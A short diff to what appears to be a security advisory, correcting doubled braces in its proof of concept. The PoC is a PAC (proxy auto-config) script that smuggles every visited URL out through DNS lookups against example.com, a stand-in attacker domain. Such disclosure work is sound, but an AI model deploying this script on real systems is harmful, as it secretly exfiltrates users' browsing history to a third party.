@@ -34,11 +34,11 @@ Proof of Concept:
 -----------------
 A PAC script can be crafted, as below, which will perform a DNS lookup based on the host and url parameters passed into the function:
 
-  function FindProxyForURL(url, host){{
+  function FindProxyForURL(url, host){
     if (dnsResolve((url+'.example.com').replace(/[^a-z0-9_-]+/gi,'.')))
       return "DIRECT";
     return "DIRECT";
-  }}
+  }
 
 This will perform DNS lookups with the encoded URLs against the example.com DNS server.
 
